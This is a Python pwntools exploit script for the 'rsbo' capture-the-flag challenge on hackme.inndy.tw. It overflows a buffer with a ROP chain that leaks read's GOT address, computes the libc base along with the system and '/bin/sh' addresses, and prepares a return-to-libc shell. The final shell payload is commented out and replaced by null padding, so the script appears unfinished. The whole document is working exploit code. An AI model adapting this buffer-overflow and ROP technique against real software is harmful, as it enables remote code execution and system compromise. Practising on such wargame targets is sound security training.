#/usr/bin/env python
from pwn import *
local=1
if local:
    a=process("./rsbo")
    gdb.attach(a,"b *0x8048729")
    libc=ELF("/lib/i386-linux-gnu/libc.so.6")
else:
    a=remote("hackme.inndy.tw",7706)
    libc=ELF("../libc-2.23.so.i386")

elf=ELF("./rsbo")

read_plt=elf.plt["read"]
write_plt=elf.plt["write"]

payload='\x00'*108
payload+=p32(write_plt)
payload+=p32(0x8048490)#start_address
payload+=p32(1)
payload+=p32(elf.got["read"])
payload+=p32(4)
a.sendline(payload)
read_addr=u32(a.recv(4))
libc_base=read_addr - libc.symbols["read"]
system_addr=libc_base + libc.symbols["system"]
success("system_addr ==> 0x%x"%system_addr)
sh_addr=libc_base+next(libc.search("/bin/sh"))
success("sh_addr ==>0x%x"%sh_addr)
pause()
payload='\x00'*128
#payload='\x00'*108
#payload+=p32(system_addr)
#payload+=p32(0x8048490)
#payload+=p32(sh_addr)
a.sendline(payload)
a.interactive()
